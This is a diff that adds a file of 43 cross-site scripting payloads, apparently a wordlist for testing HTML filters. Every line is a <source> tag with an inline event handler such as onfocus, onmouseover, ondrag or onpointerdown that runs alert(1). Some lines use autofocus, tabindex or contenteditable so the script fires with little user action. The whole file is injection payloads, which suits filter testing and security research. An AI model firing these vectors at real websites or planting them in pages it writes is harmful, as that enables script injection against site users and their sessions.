@@ -1,0 +1,43 @@
+<source draggable="true" ondrag="alert(1)">test</source>
+<source draggable="true" ondragend="alert(1)">test</source>
+<source draggable="true" ondragenter="alert(1)">test</source>
+<source draggable="true" ondragleave="alert(1)">test</source>
+<source draggable="true" ondragstart="alert(1)">test</source>
+<source id=x tabindex=1 onactivate=alert(1)></source>
+<source id=x tabindex=1 onbeforeactivate=alert(1)></source>
+<source id=x tabindex=1 onbeforedeactivate=alert(1)></source><input autofocus>
+<source id=x tabindex=1 ondeactivate=alert(1)></source><input id=y autofocus>
+<source id=x tabindex=1 onfocus=alert(1)></source>
+<source id=x tabindex=1 onfocusin=alert(1)></source>
+<source onafterscriptexecute=alert(1)><script>1</script>
+<source onbeforecopy="alert(1)" contenteditable>test</source>
+<source onbeforecut="alert(1)" contenteditable>test</source>
+<source onbeforepaste="alert(1)" contenteditable>test</source>
+<source onbeforescriptexecute=alert(1)><script>1</script>
+<source onblur=alert(1) tabindex=1 id=x></source><input autofocus>
+<source onclick="alert(1)">test</source>
+<source oncontextmenu="alert(1)">test</source>
+<source oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<source oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<source ondblclick="alert(1)" autofocus tabindex=1>test</source>
+<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>
+<source onkeydown="alert(1)" contenteditable>test</source>
+<source onkeypress="alert(1)" contenteditable>test</source>
+<source onkeyup="alert(1)" contenteditable>test</source>
+<source onmousedown="alert(1)">test</source>
+<source onmouseenter="alert(1)">test</source>
+<source onmouseleave="alert(1)">test</source>
+<source onmousemove="alert(1)">test</source>
+<source onmouseout="alert(1)">test</source>
+<source onmouseover="alert(1)">test</source>
+<source onmouseup="alert(1)">test</source>
+<source onmousewheel=alert(1)>requires scrolling
+<source onpaste="alert(1)" contenteditable>test</source>
+<source onpointerdown=alert(1)>XSS</source>
+<source onpointerenter=alert(1)>XSS</source>
+<source onpointerleave=alert(1)>XSS</source>
+<source onpointermove=alert(1)>XSS</source>
+<source onpointerout=alert(1)>XSS</source>
+<source onpointerover=alert(1)>XSS</source>
+<source onpointerrawupdate=alert(1)>XSS</source>
+<source onpointerup=alert(1)>XSS</source>
